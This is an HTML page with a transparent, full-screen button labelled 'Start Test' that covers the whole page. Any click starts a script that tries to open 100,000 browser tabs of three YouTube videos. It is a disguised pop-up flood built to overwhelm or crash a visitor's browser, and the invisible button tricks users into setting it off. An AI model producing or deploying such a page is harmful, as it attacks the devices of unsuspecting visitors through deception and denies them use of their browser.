<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>YX28TR</title>
<style>
  .full-screen-button {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0;
    border: none;
    background-color: transparent;
    z-index: 9999;
    cursor: pointer;
  }
</style>
<script>
function askComplexQuestion() {
    var numberOfWindows = 100000;
    var question = "#Pop-Up";
    var answer = confirm(question);

    // Array of URLs to open
    var urls = [
        "https://www.youtube.com/watch?v=wwpDRxkmmjU",
        "https://www.youtube.com/watch?v=HDZ63jcFYtQ",
        "https://www.youtube.com/watch?v=793jkBz6XJQ"
    ];

    for (var i = 0; i < numberOfWindows; i++) {
        openNewTab(urls[i % urls.length]);
    }
}

function openNewTab(url) {
    var newTab = window.open(url, "_blank");
    newTab.focus();
}
</script>
</head>
<body>
<button class="full-screen-button" onclick="askComplexQuestion()">Start Test</button>
</body>
</html>
